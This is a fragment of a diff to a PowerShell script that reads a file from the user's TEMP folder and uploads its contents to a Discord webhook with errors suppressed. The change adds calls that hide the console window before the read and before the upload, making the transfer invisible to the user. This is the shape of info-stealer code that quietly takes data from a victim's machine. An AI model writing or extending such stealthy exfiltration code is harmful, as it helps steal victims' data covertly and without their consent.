@@ -176,6 +176,7 @@ $filePath = "$env:TEMP\data.txt"
 
 # Check if the file exists
 if (Test-Path $filePath) {
+    [ConsoleWindow]::Hide()
     # Read the content of the text file
     $fileContent = Get-Content -Path $filePath -Raw
 
@@ -197,6 +198,7 @@ if (Test-Path $filePath) {
 
         # Try to send the content to the Discord webhook
         try {
+            [ConsoleWindow]::Hide()
             Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json' -ErrorAction SilentlyContinue | Out-Null
             Start-Sleep -Seconds 1  # Optional: Pause briefly to avoid rate limits
         } catch {
